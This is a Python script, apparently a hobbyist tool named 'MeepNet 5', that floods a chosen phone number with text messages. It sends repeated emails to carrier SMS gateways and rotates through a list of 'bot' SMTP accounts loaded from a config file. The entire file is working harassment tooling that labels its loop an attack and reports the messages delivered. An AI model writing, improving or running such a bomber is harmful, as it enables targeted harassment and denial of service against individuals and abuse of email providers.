## MeepNet ##
import time
import smtplib
import random
print(" \n\r")
print("  _   __                 _   _      _    __      _______ ")
print(" |  \/  |               | \ | |    | |   \ \    / / ____|")
print(" | \  / | ___  ___ _ __ |  \| | ___| |_   \ \  / /| |__  ")
print(" | |\/| |/ _ \/ _ \ '_ \| . ` |/ _ \ __|   \ \/ / |___ \ ")
print(" | |  | |  __/  __/ |_) | |\  |  __/ |_     \  /   ___) |")
print(" |_|  |_|\___|\___| .__/|_| \_|\___|\__|     \/   |____/ ")
print("                  | |                                    ")
print("                  |_|       Developed By EthanMeep       ")
print(" \n\r")
print("                                   Welcome To MeepNet 5 \n\r")
print("                                 Attempting To Load Config... \n\r")
#CONFIG LOAD
import configV5
print("                                 Main Server Connected At: " + configV5.server)
print("                                 On Port: " + str(configV5.port))
print("                                 " + str(len(configV5.clients)) + " Bots Loaded! \n\r")
#CONFIG LOADED
print("                                 Config Loaded Successfully! \n\r")
print("\n\r")
target = raw_input("                                 Target: ")
carrier = raw_input("                                 Carrier: ")
msg = raw_input("                                 Message: ")
msg_amount = input("                                 Amount: ")
#V5 CARRIER CHECKER
print(" \n\r")
if carrier in configV5.supported_carriers:
    print("                                 Carrier Is Verified And Supported!")
if not carrier in configV5.supported_carriers:
    print("                                 Carrier Is Not Supported! Please Restart And Try Again.")
if carrier == "att":
    carrier = "txt.att.net"
elif carrier == "cellone":
    carrier = "@sms.cellonenation.net"
elif carrier == "verizon":
    carrier = "@vtext.com"
elif carrier == "alltel":
    carrier = "@message.alltel.com"
elif carrier == "boost":
    carrier = "@myboostmobile.com"
elif carrier == "cricket":
    carrier = "@sms.mycricket.com"
elif carrier == "metropcs":
    carrier = "@mymetropcs.com"
elif carrier == "sprint":
    carrier = "@messaging.sprintpcs.com"
elif carrier == "nextel":
    carrier = "@page.nextel.com"
elif carrier == "straighttalk":
    carrier = "@vtext.com"
elif carrier == "tmobile":
    carrier = "@tmomail.net"
elif carrier == "uscellular":
    carrier = "@email.uscc.net"
elif carrier == "virgin":
    carrier = "@vmobl.com"
print(" \n\r")
print(" \n\r")
#V5 TIMER START
timer_start = time.time()
for _ in range(0,msg_amount):
#ATTACK START
    print("                                 Picking Random Email Server... ")
    LiveClient = random.choice(configV5.clients)
    print("                                 Email Server Picked! (Server: " + LiveClient + ")")
    server = smtplib.SMTP(configV5.server, configV5.port)
    server.starttls()
    print("                                 Attempting Email Server Login... ")
    server.login(LiveClient, configV5.clientpass)
    print("                                 Logged In To " + LiveClient + "!")
    print("                                 Attempting To Send From  " + LiveClient + "...")
    server.sendmail(LiveClient,target + carrier,msg)
    print("                                 Sent From  " + LiveClient + "!")
    print("                                 Logging Out... ")
    server.quit
    print("                                 Logged Out!")
#ATTACK END
elapsed_time = (time.time() - timer_start)
#V5 TIMER END
print(" \n\r")
print("                        Attack Delivered! " + str(msg_amount) + " Texts Sent In " + str(elapsed_time) + " Seconds! \n\r")
